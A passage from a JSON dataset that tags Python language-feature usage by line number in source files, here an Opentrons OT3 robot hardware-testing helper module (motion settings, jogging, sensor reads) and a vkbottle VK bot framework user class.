value=max_speed_discontinuity,\n        )\n    if direction_change_speed_discontinuity is not None:\n        set_gantry_per_axis_setting_ot3(\n            settings=api.config.motion_settings.direction_change_speed_discontinuity,\n            axis=axis,\n            load=load,\n            value=direction_change_speed_discontinuity,\n        )\n    await api.set_gantry_load(load)\n@dataclass\nclass GantryLoadSettings:\n    max_speed: float  \n    acceleration: float  \n    max_start_stop_speed: float  \n    max_change_dir_speed: float  \n    hold_current: float  \n    run_current: float  \ndef get_gantry_load_per_axis_motion_settings_ot3(\n    api: OT3API,\n    axis: OT3Axis,\n    load: Optional[GantryLoad] = None,\n) -> GantryLoadSettings:\n    if load is None:\n        load = api.gantry_load\n    ax_kind = OT3Axis.to_kind(axis)\n    m_cfg = api.config.motion_settings\n    c_cfg = api.config.current_settings\n    def _default_motion(a: str) -> float:\n        try:\n            return getattr(m_cfg, a)[load][ax_kind]\n        except KeyError:\n            return getattr(m_cfg, a)[GantryLoad.LOW_THROUGHPUT][ax_kind]\n    def _default_current(a: str) -> float:\n        try:\n            return getattr(c_cfg, a)[load][ax_kind]\n        except KeyError:\n            return getattr(c_cfg, a)[GantryLoad.LOW_THROUGHPUT][ax_kind]\n    return GantryLoadSettings(\n        max_speed=_default_motion(\"default_max_speed\"),\n        acceleration=_default_motion(\"acceleration\"),\n        max_start_stop_speed=_default_motion(\"max_speed_discontinuity\"),\n        max_change_dir_speed=_default_motion(\"direction_change_speed_discontinuity\"),\n        hold_current=_default_current(\"hold_current\"),\n        run_current=_default_current(\"run_current\"),\n    )\nasync def set_gantry_load_per_axis_settings_ot3(\n    api: OT3API,\n    settings: Dict[OT3Axis, GantryLoadSettings],\n    load: Optional[GantryLoad] = None,\n) -> None:\n    if load is None:\n        load = api.gantry_load\n    for ax, stg in settings.items():\n        await set_gantry_load_per_axis_motion_settings_ot3(\n            api,\n            ax,\n            load,\n            default_max_speed=stg.max_speed,\n            acceleration=stg.acceleration,\n            max_speed_discontinuity=stg.max_start_stop_speed,\n            direction_change_speed_discontinuity=stg.max_change_dir_speed,\n        )\n        await set_gantry_load_per_axis_current_settings_ot3(\n            api, ax, load, hold_current=stg.hold_current, run_current=stg.run_current\n        )\n    if load == api.gantry_load:\n        await api.set_gantry_load(gantry_load=load)\nasync def home_ot3(api: OT3API, axes: Optional[List[OT3Axis]] = None) -> None:\n    default_home_speed = 10.0\n    default_home_speed_xy = 40.0\n    homing_speeds: Dict[OT3Axis, float] = {\n        OT3Axis.X: default_home_speed_xy,\n        OT3Axis.Y: default_home_speed_xy,\n        OT3Axis.Z_L: default_home_speed,\n        OT3Axis.Z_R: default_home_speed,\n        OT3Axis.Z_G: default_home_speed,\n        OT3Axis.P_L: default_home_speed,\n        OT3Axis.P_R: default_home_speed,\n    }\n    cached_discontinuities: Dict[OT3Axis, float] = {\n        ax: api.config.motion_settings.max_speed_discontinuity[api.gantry_load].get(\n            OT3Axis.to_kind(ax), homing_speeds[ax]\n        )\n        for ax in homing_speeds\n    }\n    for ax, val in homing_speeds.items():\n        await set_gantry_load_per_axis_motion_settings_ot3(\n            api, ax, max_speed_discontinuity=val\n        )\n    await api.home(axes=axes)\n    for ax, val in cached_discontinuities.items():\n        await set_gantry_load_per_axis_motion_settings_ot3(\n            api, ax, max_speed_discontinuity=val\n        )\ndef _get_pipette_from_mount(api: OT3API, mount: OT3Mount) -> PipetteOT3:\n    pipette = api.hardware_pipettes[mount.to_mount()]\n    if pipette is None:\n        raise RuntimeError(f\"No pipette currently attaced to mount {mount}\")\n    return pipette\ndef get_plunger_positions_ot3(\n    api: OT3API, mount: OT3Mount\n) -> Tuple[float, float, float, float]:\n    pipette = _get_pipette_from_mount(api, mount)\n    return (\n        pipette.plunger_positions.top,\n        pipette.plunger_positions.bottom,\n        pipette.plunger_positions.blow_out,\n        pipette.plunger_positions.drop_tip,\n    )\nasync def update_pick_up_current(\n    api: OT3API, mount: OT3Mount, current: float = 0.125\n) -> None:\n    pipette = _get_pipette_from_mount(api, mount)\n    config_model = pipette.pick_up_configurations\n    config_model.current = current\n    pipette.pick_up_configurations = config_model\nasync def update_pick_up_distance(\n    api: OT3API, mount: OT3Mount, distance: float = 17.0\n) -> None:\n    pipette = _get_pipette_from_mount(api, mount)\n    config_model = pipette.pick_up_configurations\n    config_model.distance = distance\n    pipette.pick_up_configurations = config_model\nasync def move_plunger_absolute_ot3(\n    api: OT3API,\n    mount: OT3Mount,\n    position: float,\n    motor_current: Optional[float] = None,\n    speed: Optional[float] = None,\n) -> None:\n    if not api.hardware_pipettes[mount.to_mount()]:\n        raise RuntimeError(f\"No pipette found on mount: {mount}\")\n    plunger_axis = OT3Axis.of_main_tool_actuator(mount)\n    _move_coro = api._move(\n        target_position={plunger_axis: position},  \n        speed=speed,\n    )\n    if motor_current is None:\n        await _move_coro\n    else:\n        async with api._backend.restore_current():\n            await api._backend.set_active_current(\n                {OT3Axis.of_main_tool_actuator(mount): motor_current}  \n            )\n            await _move_coro\nasync def move_tip_motor_relative_ot3(\n    api: OT3API,\n    distance: float,\n    motor_current: Optional[float] = None,\n    speed: Optional[float] = None,\n) -> None:\n    if not api.hardware_pipettes[OT3Mount.LEFT.to_mount()]:\n        raise RuntimeError(\"No pipette found on LEFT mount\")\n    if distance < 0:\n        action = \"home\"\n    else:\n        action = \"clamp\"\n    _move_coro = api._backend.tip_action(\n        axes=[OT3Axis.Q],\n        distance=distance,\n        speed=speed if speed else 5,\n        tip_action=action,\n    )\n    if motor_current is None:\n        await _move_coro\n    else:\n        async with api._backend.restore_current():\n            await api._backend.set_active_current(\n                {OT3Axis.Q: motor_current}  \n            )\n            await _move_coro\nasync def move_plunger_relative_ot3(\n    api: OT3API,\n    mount: OT3Mount,\n    delta: float,\n    motor_current: Optional[float] = None,\n    speed: Optional[float] = None,\n) -> None:\n    current_pos = await api.current_position_ot3(mount=mount)\n    plunger_axis = OT3Axis.of_main_tool_actuator(mount)\n    plunger_pos = current_pos[plunger_axis]\n    return await move_plunger_absolute_ot3(\n        api, mount, plunger_pos + delta, motor_current, speed\n    )\nasync def move_gripper_jaw_relative_ot3(api: OT3API, delta: float) -> None:\n    print(\"FIXME: Not using relative distances for gripper, using absolute...\")\n    await api.hold_jaw_width(int(delta))\ndef get_endstop_position_ot3(api: OT3API, mount: OT3Mount) -> Dict[OT3Axis, float]:\n    transforms = api._robot_calibration\n    machine_pos_per_axis = api._backend.home_position()\n    deck_pos_per_axis = deck_from_machine(\n        machine_pos_per_axis,\n        transforms.deck_calibration.attitude,\n        transforms.carriage_offset,\n    )\n    mount_pos_per_axis = api._effector_pos_from_carriage_pos(\n        mount, deck_pos_per_axis, None\n    )\n    return {ax: val for ax, val in mount_pos_per_axis.items()}\ndef get_gantry_homed_position_ot3(api: OT3API, mount: OT3Mount) -> Point:\n    axes_pos = get_endstop_position_ot3(api, mount)\n    return Point(\n        x=axes_pos[OT3Axis.X],\n        y=axes_pos[OT3Axis.Y],\n        z=axes_pos[OT3Axis.by_mount(mount)],\n    )\nclass OT3JogTermination(Exception):\n    pass\nclass OT3JogNoInput(Exception):\n    pass\ndef _jog_read_user_input(terminator: str, home_key: str) -> Tuple[str, float, bool]:\n    user_input = input(f'\\tJog eg: x-10.5 (ENTER to repeat, \"{terminator}\" to stop): ')\n    user_input = user_input.strip().replace(\" \", \"\")\n    if user_input == terminator:\n        raise OT3JogTermination()\n    if not user_input:\n        raise OT3JogNoInput()\n    if home_key in user_input:\n        user_input = user_input.replace(home_key, \"\")\n        do_home = True\n        distance = 0.0\n    else:\n        do_home = False\n        distance = float(user_input[1:])\n    axis = user_input[0].upper()\n    if axis not in \"XYZPG\":\n        raise ValueError(f'Unexpected axis: \"{axis}\"')\n    return axis, distance, do_home\nasync def _jog_axis_some_distance(\n    api: OT3API,\n    mount: OT3Mount,\n    axis: str,\n    distance: float,\n    speed: Optional[float],\n) -> None:\n    if not axis or distance == 0.0:\n        return\n    elif axis == \"G\":\n        await move_gripper_jaw_relative_ot3(api, distance)\n    elif axis == \"P\":\n        await move_plunger_relative_ot3(api, mount, distance, speed=speed)\n    else:\n        delta = Point(**{axis.lower(): distance})\n        await api.move_rel(mount=mount, delta=delta, speed=speed)\nasync def _jog_print_current_position(\n    api: OT3API, mount: OT3Mount, critical_point: Optional[CriticalPoint] = None\n) -> None:\n    z_axis = OT3Axis.by_mount(mount)\n    instr_axis = OT3Axis.of_main_tool_actuator(mount)\n    motors_pos = await api.current_position_ot3(\n        mount=mount, critical_point=critical_point\n    )\n    enc_pos = await api.encoder_current_position_ot3(\n        mount=mount, critical_point=critical_point\n    )\n    mx, my, mz, mp = [\n        round(motors_pos[ax], 2) for ax in [OT3Axis.X, OT3Axis.Y, z_axis, instr_axis]\n    ]\n    ex, ey, ez, ep = [\n        round(enc_pos[ax], 2) for ax in [OT3Axis.X, OT3Axis.Y, z_axis, instr_axis]\n    ]\n    print(f\"\\tDeck Coordinate: X={mx}, Y={my}, Z={mz}, Instr={mp}\")\n    print(f\"\\tEnc. Coordinate: X={ex}, Y={ey}, Z={ez}, Instr={ep}\")\nasync def _jog_do_print_then_input_then_move(\n    api: OT3API,\n    mount: OT3Mount,\n    critical_point: Optional[CriticalPoint],\n    axis: str,\n    distance: float,\n    do_home: bool,\n    display: Optional[bool] = True,\n    speed: Optional[float] = None,\n) -> Tuple[str, float, bool]:\n    try:\n        if display:\n            await _jog_print_current_position(api, mount, critical_point)\n        axis, distance, do_home = _jog_read_user_input(\n            terminator=\"stop\", home_key=\"home\"\n        )\n    except OT3JogNoInput:\n        pass\n    if do_home:\n        str_to_axes = {\n            \"X\": OT3Axis.X,\n            \"Y\": OT3Axis.Y,\n            \"Z\": OT3Axis.by_mount(mount),\n            \"P\": OT3Axis.of_main_tool_actuator(mount),\n            \"G\": OT3Axis.G,\n            \"Q\": OT3Axis.Q,\n        }\n        await api.home([str_to_axes[axis]])\n    else:\n        await _jog_axis_some_distance(api, mount, axis, distance, speed)\n    return axis, distance, do_home\nasync def jog_mount_ot3(\n    api: OT3API,\n    mount: OT3Mount,\n    critical_point: Optional[CriticalPoint] = None,\n    display: Optional[bool] = True,\n    speed: Optional[float] = None,\n) -> Dict[OT3Axis, float]:\n    if api.is_simulator:\n        return await api.current_position_ot3(\n            mount=mount, critical_point=critical_point\n        )\n    axis: str = \"\"\n    distance: float = 0.0\n    do_home: bool = False\n    print(\"jogging\")\n    while True:\n        try:\n            axis, distance, do_home = await _jog_do_print_then_input_then_move(\n                api,\n                mount,\n                critical_point,\n                axis,\n                distance,\n                do_home,\n                display=display,\n                speed=speed,\n            )\n        except ValueError as e:\n            print(e)\n            continue\n        except OT3JogTermination:\n            print(\"done jogging\")\n            return await api.current_position_ot3(\n                mount=mount, critical_point=critical_point\n            )\nasync def move_to_arched_ot3(\n    api: OT3API,\n    mount: OT3Mount,\n    abs_position: Point,\n    speed: Optional[float] = None,\n    safe_height: float = -100.0,\n) -> None:\n    z_ax = OT3Axis.by_mount(mount)\n    max_z = get_endstop_position_ot3(api, mount)[z_ax]\n    here = await api.gantry_position(mount=mount, refresh=True)\n    arch_z = min(max(here.z, abs_position.z, safe_height), max_z)\n    points = [\n        here._replace(z=arch_z),\n        abs_position._replace(z=arch_z),\n        abs_position,\n    ]\n    for p in points:\n        await api.move_to(mount=mount, abs_position=p, speed=speed)\nclass SensorResponseBad(Exception):\n    pass\nasync def _get_temp_humidity(\n    messenger: CanMessenger,\n    mount: OT3Mount,\n    sensor_id: SensorId = SensorId.S0,\n) -> Tuple[float, float]:\n    node_id = sensor_node_for_mount(mount)\n    environment = sensor_types.EnvironmentSensor.build(sensor_id, node_id)\n    s_driver = sensor_driver.SensorDriver()\n    data = await s_driver.read(\n        messenger, environment, offset=False, timeout=2  \n    )\n    if data is None:\n        raise SensorResponseBad(\"no response from sensor\")\n    return data.temperature.to_float(), data.humidity.to_float()  \nasync def get_temperature_humidity_ot3(\n    api: OT3API,\n    mount: OT3Mount,\n    sensor_id: SensorId = SensorId.S0,\n) -> Tuple[float, float]:\n    if api.is_simulator:\n        return 25.0, 50.0\n    messenger = api._backend._messenger  \n    return await _get_temp_humidity(messenger, mount, sensor_id)\ndef get_temperature_humidity_outside_api_ot3(\n    mount: OT3Mount,\n    is_simulating: bool = False,\n    sensor_id: SensorId = SensorId.S0,\n) -> Tuple[float, float]:\n    settings = DriverSettings(\n        interface=can_bus_settings.DEFAULT_INTERFACE,\n        port=can_bus_settings.DEFAULT_PORT,\n        host=can_bus_settings.DEFAULT_HOST,\n        bit_rate=can_bus_settings.DEFAULT_BITRATE,\n        channel=can_bus_settings.DEFAULT_CHANNEL,\n    )\n    async def _run() -> Tuple[float, float]:\n        if is_simulating:\n            return 25.0, 50.0\n        async with build.driver(settings) as driver:\n            messenger = CanMessenger(driver=driver)\n            messenger.start()\n            ret = await _get_temp_humidity(messenger, mount, sensor_id)\n            await messenger.stop()\n            return ret\n    loop = asyncio.get_event_loop()\n    task = loop.create_task(_run())\n    loop.run_until_complete(task)\n    return task.result()\nasync def get_capacitance_ot3(\n    api: OT3API, mount: OT3Mount, sensor_id: SensorId = SensorId.S0\n) -> float:\n    if api.is_simulator:\n        return 0.0\n    node_id = sensor_node_for_mount(mount)\n    capacitive = sensor_types.CapacitiveSensor.build(sensor_id, node_id)\n    s_driver = sensor_driver.SensorDriver()\n    data = await s_driver.read(\n        api._backend._messenger, capacitive, offset=False, timeout=2  \n    )\n    if data is None:\n        raise SensorResponseBad(\"no response from sensor\")\n    return data.to_float()  \nasync def get_pressure_ot3(\n    api: OT3API, mount: OT3Mount, sensor_id: SensorId = SensorId.S0\n) -> float:\n    if api.is_simulator:\n        return 0.0\n    node_id = sensor_node_for_mount(mount)\n    pressure = sensor_types.PressureSensor.build(sensor_id, node_id)\n    s_driver = sensor_driver.SensorDriver()\n    data = await s_driver.read(\n        api._backend._messenger, pressure, offset=False, timeout=2  \n    )\n    if data is None:\n        raise SensorResponseBad(\"no response from sensor\")\n    return data.to_float()  \nasync def wait_for_stable_capacitance_ot3(\n    api: OT3API,\n    mount: OT3Mount,\n    threshold_pf: float,\n    duration: float,\n    retries: int = 10,\n) -> None:\n    if api.is_simulator:\n        return\n    data = list()\n    async def _read() -> None:\n        cap_val = await get_capacitance_ot3(api, mount)\n        data.append(\n            (\n                time(),\n                cap_val,\n            )\n        )\n    def _data_duration() -> float:\n        if len(data) < 2:\n            return 0.0\n        return data[-1][0] - data[0][0]\n    def _data_stats() -> Tuple[float, float]:\n        cap_data = [d[1] for d in data]\n        avg = sum(cap_data) / len(cap_data)\n        var = max(cap_data) - min(cap_data)\n        return avg, var\n    print(f\"Waiting for {duration} seconds of stable capacitance, please wait...\")\n    while _data_duration() < duration:\n        await _read()\n    average, variance = _data_stats()\n    print(\n        f\"Read {len(data)} samples in {_data_duration()} seconds \"\n        f\"(average={average}, variance={variance})\"\n    )\n    if variance > threshold_pf or variance == 0.0:\n        if retries <= 0:\n            raise RuntimeError(\"Unable to get stable capacitance reading\")\n        print(\"Unstable, repeating...\")\n        await wait_for_stable_capacitance_ot3(\n            api, mount, threshold_pf, duration, retries - 1\n        )\ndef get_pipette_offset_ot3(api: OT3API, mount: OT3Mount) -> Point:\n    pipette = api.hardware_pipettes[mount.to_mount()]\n    assert pipette, f\"No pipette found on mount: {mount}\"\n    return pipette._pipette_offset.offset + Point()\ndef set_pipette_offset_ot3(api: OT3API, mount: OT3Mount, offset: Point) -> None:\n    pipette = api.hardware_pipettes[mount.to_mount()]\n    assert pipette, f\"No pipette found on mount: {mount}\"\n    pipette._pipette_offset.offset = offset\ndef get_gripper_offset_ot3(api: OT3API) -> Point:\n    assert api.has_gripper, \"No gripper found\"\n    return api._gripper_handler._gripper._calibration_offset.offset  \ndef set_gripper_offset_ot3(api: OT3API, offset: Point) -> None:\n    assert api.has_gripper, \"No gripper found\"\n    api._gripper_handler._gripper._calibration_offset.offset = offset  \ndef get_slot_size() -> Point:\n    deck = load_deck(\"ot3_standard\", version=3)\n    slots = deck[\"locations\"][\"orderedSlots\"]\n    bounding_box = slots[0][\"boundingBox\"]\n    return Point(\n        x=bounding_box[\"xDimension\"],\n        y=bounding_box[\"yDimension\"],\n        z=bounding_box[\"zDimension\"],\n    )\ndef get_default_tip_length(volume: int) -> float:\n    return TIP_LENGTH_LOOKUP[volume] - TIP_LENGTH_OVERLAP\ndef get_slot_bottom_left_position_ot3(slot: int) -> Point:\n    deck = load_deck(\"ot3_standard\", version=3)\n    slots = deck[\"locations\"][\"orderedSlots\"]\n    s = slots[slot - 1]\n    return Point(*s[\"position\"])\ndef get_slot_top_left_position_ot3(slot: int) -> Point:\n    bottom_left = get_slot_bottom_left_position_ot3(slot)\n    slot_size = get_slot_size()\n    return bottom_left + Point(y=slot_size.y)\ndef get_theoretical_a1_position(slot: int, labware: str) -> Point:\n    labware_def = load_labware(loadname=labware, version=1)\n    dims = labware_def[\"dimensions\"]\n    well_a1 = labware_def[\"wells\"][\"A1\"]\n    a1_pos = Point(x=well_a1[\"x\"], y=well_a1[\"y\"], z=dims[\"zDimension\"])\n    slot_pos = get_slot_bottom_left_position_ot3(slot)\n    y_shift_from_clips = (get_slot_size().y - dims[\"yDimension\"]) * 0.5\n    return slot_pos + a1_pos + Point(y=y_shift_from_clips)\ndef get_slot_calibration_square_position_ot3(slot: int) -> Point:\n    slot_top_left = get_slot_top_left_position_ot3(slot)\n    calib_sq_offset = CALIBRATION_SQUARE_EVT.top_left_offset\n    return slot_top_left + calib_sq_offset\ndef get_pipette_serial_ot3(pipette: Union[PipetteOT2, PipetteOT3]) -> str:\n    model = pipette.model\n    volume = model.split(\"_\")[0].replace(\"p\", \"\")\n    volume = \"1K\" if volume == \"1000\" else volume\n    channels = \"S\" if \"single\" in model else \"M\"\n    version = model.split(\"v\")[-1].strip().replace(\".\", \"\")\n    assert pipette.pipette_id, f\"no pipette_id found for pipette: {pipette}\"\n    if \"P\" in pipette.pipette_id:\n        id = pipette.pipette_id[7:]  \n    else:\n        id = pipette.pipette_id\n    return f\"P{volume}{channels}V{version}{id}\"\ndef clear_pipette_ul_per_mm(api: OT3API, mount: OT3Mount) -> None:\n    def _ul_per_mm_of_shaft_diameter(diameter: float) -> float:\n        return pi * pow(diameter / 2, 2)\n    pip = api.hardware_pipettes[mount.to_mount()]\n    assert pip\n    if \"p50\" in pip.model.lower():\n        pip_nominal_ul_per_mm = _ul_per_mm_of_shaft_diameter(1)\n    elif \"p1000\" in pip.model.lower():\n        pip_nominal_ul_per_mm = _ul_per_mm_of_shaft_diameter(4.5)\n    else:\n        raise RuntimeError(f\"unexpected pipette model: {pip.model}\")\n    ul_per_mm = [\n        (\n            0,\n            0.0,\n            pip_nominal_ul_per_mm,\n        ),\n        (\n            10000,\n            0.0,\n            pip_nominal_ul_per_mm,\n        ),\n    ]\n    pip._active_tip_settings.aspirate[\"default\"] = ul_per_mm  \n    pip._active_tip_settings.dispense[\"default\"] = ul_per_mm  \n    pip.ul_per_mm.cache_clear()\n    assert pip.ul_per_mm(1, \"aspirate\") == pip_nominal_ul_per_mm\n    assert pip.ul_per_mm(pip.working_volume, \"aspirate\") == pip_nominal_ul_per_mm\n    assert pip.ul_per_mm(1, \"dispense\") == pip_nominal_ul_per_mm\n    assert pip.ul_per_mm(pip.working_volume, \"dispense\") == pip_nominal_ul_per_mm",
            "patterns": {
                "pep_468": [
                    [
                        118,
                        "builder(loop=loop, **kwargs)"
                    ],
                    [
                        124,
                        "builder(loop=loop, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        33,
                        "top_left_offset: Point"
                    ],
                    [
                        34,
                        "width: float"
                    ],
                    [
                        35,
                        "height: float"
                    ],
                    [
                        36,
                        "depth: float"
                    ],
                    [
                        39,
                        "length: float"
                    ],
                    [
                        40,
                        "diameter: float"
                    ],
                    [
                        212,
                        "max_speed: float"
                    ],
                    [
                        213,
                        "acceleration: float"
                    ],
                    [
                        214,
                        "max_start_stop_speed: float"
                    ],
                    [
                        215,
                        "max_change_dir_speed: float"
                    ],
                    [
                        216,
                        "hold_current: float"
                    ],
                    [
                        217,
                        "run_current: float"
                    ],
                    [
                        271,
                        "homing_speeds: Dict[OT3Axis, float] = {"
                    ],
                    [
                        280,
                        "cached_discontinuities: Dict[OT3Axis, float] = {"
                    ],
                    [
                        506,
                        "axis: str = \"\""
                    ],
                    [
                        507,
                        "distance: float = 0.0"
                    ],
                    [
                        508,
                        "do_home: bool = False"
                    ],
                    [
                        105,
                        "builder: Callable["
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_557": [
                    [
                        2,
                        2,
                        "dataclasses import",
                        "from dataclasses import dataclass"
                    ],
                    [
                        32,
                        36,
                        "dataclass definition",
                        "class CalibrationSquare:\n    top_left_offset: Point\n    width: float\n    height: float\n    depth: float"
                    ],
                    [
                        38,
                        40,
                        "dataclass definition",
                        "class CalibrationProbe:\n    length: float\n    diameter: float"
                    ],
                    [
                        211,
                        217,
                        "dataclass definition",
                        "class GantryLoadSettings:\n    max_speed: float  \n    acceleration: float  \n    max_start_stop_speed: float  \n    max_change_dir_speed: float  \n    hold_current: float  \n    run_current: float  "
                    ]
                ],
                "pep_585": [
                    [
                        7,
                        "from typing import Callable, Coroutine, Dict, List, Optional, Tuple, Union",
                        "suggestion"
                    ],
                    [
                        7,
                        "from typing import Callable, Coroutine, Dict, List, Optional, Tuple, Union",
                        "suggestion"
                    ],
                    [
                        7,
                        "from typing import Callable, Coroutine, Dict, List, Optional, Tuple, Union",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        68,
                        "def _create_attached_instruments_dict(",
                        "violation"
                    ],
                    [
                        271,
                        "    homing_speeds: Dict[OT3Axis, float] = {",
                        "violation"
                    ],
                    [
                        280,
                        "    cached_discontinuities: Dict[OT3Axis, float] = {",
                        "violation"
                    ],
                    [
                        300,
                        "def get_plunger_positions_ot3(",
                        "violation"
                    ],
                    [
                        388,
                        "def get_endstop_position_ot3(api: OT3API, mount: OT3Mount) -> Dict[OT3Axis, float]:",
                        "violation"
                    ],
                    [
                        411,
                        "def _jog_read_user_input(terminator: str, home_key: str) -> Tuple[str, float, bool]:",
                        "violation"
                    ],
                    [
                        573,
                        "def get_temperature_humidity_outside_api_ot3(",
                        "violation"
                    ],
                    [
                        648,
                        "    def _data_stats() -> Tuple[float, float]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        128,
                        129,
                        "async for",
                        "async for update in api.update_firmware():\n            print(f\"Update: {update.subsystem.name}: {update.progress}%\")"
                    ]
                ],
                "pep_498": [
                    [
                        67,
                        "    return f\"{size}{channels}{version}{date}A0{unique_number}\""
                    ],
                    [
                        670,
                        "    assert pipette, f\"No pipette found on mount: {mount}\""
                    ],
                    [
                        674,
                        "    assert pipette, f\"No pipette found on mount: {mount}\""
                    ],
                    [
                        720,
                        "    assert pipette.pipette_id, f\"no pipette_id found for pipette: {pipette}\""
                    ],
                    [
                        725,
                        "    return f\"P{volume}{channels}V{version}{id}\""
                    ],
                    [
                        412,
                        "    user_input = input(f'\\tJog eg: x-10.5 (ENTER to repeat, \"{terminator}\" to stop): ')"
                    ],
                    [
                        462,
                        "    print(f\"\\tDeck Coordinate: X={mx}, Y={my}, Z={mz}, Instr={mp}\")"
                    ],
                    [
                        463,
                        "    print(f\"\\tEnc. Coordinate: X={ex}, Y={ey}, Z={ez}, Instr={ep}\")"
                    ],
                    [
                        653,
                        "    print(f\"Waiting for {duration} seconds of stable capacitance, please wait...\")"
                    ],
                    [
                        658,
                        "        f\"Read {len(data)} samples in {_data_duration()} seconds \""
                    ],
                    [
                        298,
                        "        raise RuntimeError(f\"No pipette currently attaced to mount {mount}\")"
                    ],
                    [
                        332,
                        "        raise RuntimeError(f\"No pipette found on mount: {mount}\")"
                    ],
                    [
                        427,
                        "        raise ValueError(f'Unexpected axis: \"{axis}\"')"
                    ],
                    [
                        129,
                        "            print(f\"Update: {update.subsystem.name}: {update.progress}%\")"
                    ],
                    [
                        736,
                        "        raise RuntimeError(f\"unexpected pipette model: {pip.model}\")"
                    ]
                ]
            }
        },
        "102": {
            "file": "from asyncio import get_event_loop\nfrom typing import TYPE_CHECKING, NoReturn, Optional, Type, Union\nfrom vkbottle.api import API\nfrom vkbottle.dispatch import BuiltinStateDispenser, Router\nfrom vkbottle.exception_factory import ErrorHandler\nfrom vkbottle.framework.abc import ABCFramework\nfrom vkbottle.framework.labeler import UserLabeler\nfrom vkbottle.modules import logger\nfrom vkbottle.polling import UserPolling\nfrom vkbottle.tools import LoopWrapper, UserAuth\nif TYPE_CHECKING:\n    from asyncio import AbstractEventLoop\n    from vkbottle.api import ABCAPI, Token\n    from vkbottle.dispatch import ABCRouter, ABCStateDispenser\n    from vkbottle.exception_factory import ABCErrorHandler\n    from vkbottle.framework.labeler import ABCLabeler\n    from vkbottle.polling import ABCPolling\nclass User(ABCFramework):\n    def __init__(\n        self,\n        token: Optional[\"Token\"] = None,\n        api: Optional[\"ABCAPI\"] = None,\n        polling: Optional[\"ABCPolling\"] = None,\n        loop: Optional[\"AbstractEventLoop\"] = None,\n        loop_wrapper: Optional[LoopWrapper] = None,\n        router: Optional[\"ABCRouter\"] = None,\n        labeler: Optional[\"ABCLabeler\"] = None,\n        state_dispenser: Optional[\"ABCStateDispenser\"] = None,\n        error_handler: Optional[\"ABCErrorHandler\"] = None,\n        task_each_event: bool = True,\n    ):\n        self.api: Union[\"ABCAPI\", API] = API(token) if token is not None else api  \n        self.error_handler = error_handler or ErrorHandler()\n        self.loop_wrapper = loop_wrapper or LoopWrapper()\n        self.labeler = labeler or UserLabeler()\n        self.state_dispenser = state_dispenser or BuiltinStateDispenser()\n        self._polling = polling or UserPolling(self.api)\n        self._router = router or Router()\n        self._loop = loop\n        self.task_each_event = task_each_event\n    @property\n    def polling(self) -> \"ABCPolling\":\n        return self._polling.construct(self.api, self.error_handler)\n    @property\n    def router(self) -> \"ABCRouter\":\n        return self._router.construct(\n            views=self.labeler.views(),\n            state_dispenser=self.state_dispenser,\n            error_handler=self.error_handler,\n        )\n    @router.setter\n    def router(self, new_router: \"ABCRouter\"):\n        self._router = new_router\n    @property\n    def on(self) -> \"ABCLabeler\":\n        return self.labeler\n    @classmethod\n    def direct_auth_sync(\n        cls: Type[\"User\"],\n        login: str,\n        password: str,\n        client_id: Optional[int] = None,\n        client_secret: Optional[str] = None,\n        **kwargs,\n    ):\n        loop = get_event_loop()\n        assert not loop.is_running(), \"Event loop is already running, use direct_auth instead\"\n        return loop.run_until_complete(\n            cls.direct_auth(\n                login=login,\n                password=password,\n                client_id=client_id,\n                client_secret=client_secret,\n                **kwargs,\n            )\n        )\n    @classmethod\n    async def direct_auth(\n        cls: Type[\"User\"],\n        login: str,\n        password: str,\n        client_id: Optional[int] = None,\n        client_secret: Optional[str] = None,\n        **kwargs,\n    ):\n        token = await UserAuth(client_id, client_secret).get_token(login, password)\n        return cls(token=token, **kwargs)\n    async def run_polling(self, custom_polling: Optional[\"ABCPolling\"] = None) -> NoReturn:  \n        polling = custom_polling or self.polling\n        logger.info(\"Starting polling for {!r}\", polling.api)\n        async for event in polling.listen():  \n            logger.debug(\"New event was received: {}\", event)\n            for update in event.get(\"updates\", []):\n                if not self.task_each_event:\n                    await self.router.route(update, polling.api)\n                else:\n                    self.loop.create_task(self.router.route(update, polling.api))\n    def run_forever(self) -> NoReturn:  \n        logger.info(\"Loop will be run forever\")\n        self.loop_wrapper.add_task(self.run_polling())\n        self.loop_wrapper.run_forever(self.loop)\n    @property\n    def loop(self) -> \"AbstractEventLoop\":\n        if self._loop is None:\n            self._loop = get_event_loop()\n        return self._loop\n    @loop.setter\n    def loop(self, new_loop: \"AbstractEventLoop\"):\n        self._loop = new_loop",
            "patterns": {
                "pep_468": [
                    [
                        69,
                        "cls.direct_auth(\n                login=login,\n                password=password,\n                client_id=client_id,\n                client_secret=client_secret,\n                **kwargs,\n            )"
                    ],
                    [
                        87,
                        "cls(token=token, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        32,
                        "self.api: Union[\"ABCAPI\", API] = API(token) if token is not None else api"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "from asyncio import get_event_loop"
                    ],
                    [
                        12,
                        12,
                        "import",
                        "    from asyncio import AbstractEventLoop"
                    ]
                ],
                "pep_563": [
                    [
                        42,
                        "    def polling(self) -> \"ABCPolling\":",
                        "quoted annotation"
                    ],
                    [
                        45,
                        "    def router(self) -> \"ABCRouter\":",
                        "quoted annotation"
                    ],
                    [
                        52,
                        "    def router(self, new_router: \"ABCRouter\"):",
                        "quoted annotation"
                    ],
                    [
                        55,
                        "    def on(self) -> \"ABCLabeler\":",
                        "quoted annotation"
                    ],
                    [
                        103,
                        "    def loop(self) -> \"AbstractEventLoop\":",
                        "quoted annotation"
                    ],
                    [
                        108,
                        "    def loop(self, new_loop: \"AbstractEventLoop\"):",
                        "quoted annotation"
                    ]
                ],
                "pep_525": [
                    [
                        91,
                        97,
                        "async for",
                        "async for event in polling.listen():  \n            logger.debug(\"New event was received: {}\", event)\n            for update in event.get(\"updates\", []):\n                if not self.task_each_event:\n                    await self.router.route(update, polling.api)\n                else:\n                    self.loop.create_task(self.router.route(update, polling.api))"
                    ]
                ]
            }
        },
        "103": {
